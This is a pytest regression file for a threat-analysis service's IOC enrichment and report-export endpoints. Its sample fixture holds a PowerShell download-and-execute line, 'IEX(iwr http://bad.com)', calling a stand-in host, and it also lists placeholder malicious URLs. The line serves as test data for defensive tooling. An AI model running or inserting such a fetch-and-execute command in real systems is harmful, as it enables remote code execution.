"""Regression tests for the new CyberLab in-page OSINT enrichment endpoints
+ CSV/JSON export formats.

Runs against the live localhost:8001 backend (same pattern as the other
cyberlab tests to avoid Motor + TestClient event-loop issues).
"""
from __future__ import annotations
import os
import pytest
import httpx


BASE = os.environ.get("CYBERLAB_TEST_BASE", "http://localhost:8001")


@pytest.fixture(scope="module")
def client():
    with httpx.Client(base_url=BASE, timeout=45.0) as c:
        yield c


def test_enrich_iocs_rejects_empty(client):
    r = client.post("/api/cyberlab/enrich-iocs", json={"values": []})
    assert r.status_code == 400


def test_enrich_iocs_rejects_bad_depth(client):
    r = client.post("/api/cyberlab/enrich-iocs", json={"values": ["1.1.1.1"], "depth": "wrong"})
    assert r.status_code == 400


def test_enrich_iocs_free_shape(client):
    r = client.post("/api/cyberlab/enrich-iocs",
                    json={"values": ["1.1.1.1", "google.com"], "depth": "free"})
    assert r.status_code == 200
    d = r.json()
    assert d["count"] == 2
    assert d["depth"] == "free"
    assert d["duration_ms"] > 0
    assert "cache_hit_rate" in d
    assert len(d["results"]) == 2
    for row in d["results"]:
        # Free depth => no reputation providers should be included
        assert row.get("reputation") is None
        assert "type" in row
        assert "enrichment" in row
        assert "links" in row


def test_enrich_iocs_caps_at_20(client):
    values = [f"10.0.0.{i}" for i in range(1, 40)]  # 39 values
    r = client.post("/api/cyberlab/enrich-iocs", json={"values": values, "depth": "free"})
    assert r.status_code == 200
    assert r.json()["count"] == 20


def test_enrich_iocs_dedupe(client):
    r = client.post("/api/cyberlab/enrich-iocs",
                    json={"values": ["8.8.8.8", "8.8.8.8", "8.8.8.8"], "depth": "free"})
    assert r.status_code == 200
    assert r.json()["count"] == 1


def test_enrich_iocs_mixed_types_selective(client):
    """Simulate the CyberLab IOC-selection flow: enrich a hand-picked subset
    of extracted IOCs (mix of URL, IP, domain, hash)."""
    r = client.post("/api/cyberlab/enrich-iocs", json={
        "values": [
            "https://malicious.site/beacon",
            "45.137.21.90",
            "44d88612fea8a8f36de82e1278abb02f",  # md5 (EICAR)
        ],
        "depth": "free",
    })
    assert r.status_code == 200
    d = r.json()
    assert d["count"] == 3
    kinds = {row["type"] for row in d["results"]}
    assert kinds == {"url", "ip", "md5"}


def test_enrich_metrics_snapshot(client):
    r = client.get("/api/cyberlab/enrich-metrics")
    assert r.status_code == 200
    d = r.json()
    assert "total_calls" in d
    assert "overall_cache_hit_rate" in d
    assert "providers" in d and isinstance(d["providers"], list)
    assert "recent_batches" in d


def test_enrich_cache_speedup(client):
    """Second call for same IOC must be significantly faster (>3x) thanks
    to the 24h enrichment cache we introduced."""
    payload = {"values": ["9.9.9.9"], "depth": "free"}
    r1 = client.post("/api/cyberlab/enrich-iocs", json=payload).json()
    r2 = client.post("/api/cyberlab/enrich-iocs", json=payload).json()
    # Second call should be at least 3x faster (usually 10-100x on cache hit).
    assert r2["duration_ms"] < max(50, r1["duration_ms"] / 3), (
        f"expected cache speedup — first={r1['duration_ms']} second={r2['duration_ms']}"
    )


# ---------------------------------------------------------------------------
# Export endpoints — CSV / JSON / MD / PDF
# ---------------------------------------------------------------------------

_SAMPLE = {
    "input": "powershell -e X",
    "output": "IEX(iwr http://bad.com)",
    "trace": [{"id": "b64", "name": "Base64 Decode", "category": "Encoding",
               "input_preview": "…", "output_preview": "…",
               "output_size": 20, "duration_ms": 1.2}],
    "analysis": {
        "verdict": "malicious", "risk_score": 78,
        "summary": "Malicious PowerShell",
        "mitre": [{"id": "T1059.001", "name": "PowerShell",
                   "tactic": "Execution", "description": "", "evidence": ["powershell"]}],
        "iocs": [{"type": "url", "value": "http://bad.com", "context": ""}],
        "rules": [], "risk_reasons": [],
    },
    "ai": {"summary": "Highly suspicious PowerShell downloader.",
           "sigma_rule": "title: PS Downloader\n",
           "yara_rule": "rule PS { condition: true }\n"},
    "enriched_iocs": [{
        "value": "1.1.1.1", "type": "ip", "links": {},
        "reputation": {
            "vt": {"found": True, "malicious": 3, "suspicious": 1, "total": 90},
            "abuseipdb": {"score": 72, "reports": 15},
        },
        "enrichment": {"kind": "ip",
                       "geo": {"country": "US", "city": "LA", "isp": "Cloudflare"},
                       "open_ports": [80, 443]},
        "ai_summary": "Cloudflare edge — likely benign.",
    }],
    "enrichment_meta": {"count": 1, "flagged": 1, "duration_ms": 1500.0,
                        "iocs_per_sec": 0.67, "cache_hit_rate": 0.5, "depth": "comprehensive"},
}


def test_export_csv_contains_all_sections(client):
    r = client.post("/api/cyberlab/export/csv", json=_SAMPLE)
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("text/csv")
    txt = r.text
    for marker in ("NivX Forge Report", "MITRE ATT&CK", "INDICATORS OF COMPROMISE",
                   "OSINT ENRICHMENT", "1.1.1.1", "Cloudflare",
                   "AI verdict", "Cloudflare edge"):
        assert marker in txt, f"missing CSV section/marker: {marker}"


def test_export_json_shape(client):
    import json as _j
    r = client.post("/api/cyberlab/export/json", json=_SAMPLE)
    assert r.status_code == 200
    d = _j.loads(r.text)
    assert d["source"] == "NivX Machines · NivX Forge"
    assert d["verdict"] == "malicious"
    assert d["risk_score"] == 78
    assert len(d["enriched_iocs"]) == 1
    assert d["enriched_iocs"][0]["value"] == "1.1.1.1"


def test_export_markdown_includes_enrichment(client):
    r = client.post("/api/cyberlab/export/markdown", json=_SAMPLE)
    assert r.status_code == 200
    md = r.text
    assert "## OSINT Enrichment Report" in md
    assert "1.1.1.1" in md
    assert "AI Verdicts" in md


def test_export_pdf_returns_valid_pdf(client):
    r = client.post("/api/cyberlab/export/pdf", json=_SAMPLE)
    assert r.status_code == 200
    assert r.headers["content-type"] == "application/pdf"
    # PDF magic
    assert r.content.startswith(b"%PDF-")
    # Must be at least a few KB now that it includes the enrichment table
    assert len(r.content) > 2000
